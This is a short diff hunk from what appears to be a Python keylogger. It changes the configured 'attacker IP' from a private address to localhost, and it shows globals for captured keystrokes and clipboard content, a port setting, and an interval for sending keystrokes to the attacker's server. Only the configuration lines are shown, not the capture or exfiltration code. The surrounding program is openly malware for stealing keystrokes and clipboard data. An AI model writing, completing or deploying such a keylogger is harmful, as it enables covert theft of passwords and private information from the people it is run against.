@@ -22,7 +22,7 @@ import pyperclip  # Add this import
 keystrokes = ""  # Global variable to store captured keystrokes
 clipboard_data = ""  # Global variable to store clipboard content
 
-server_ip = "192.168.213.174"  # Change this based on your attacker IP
+server_ip = "127.0.0.1"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
 send_interval = 5  # Interval (in seconds) between sending keystrokes to the server (Change if you want)
 
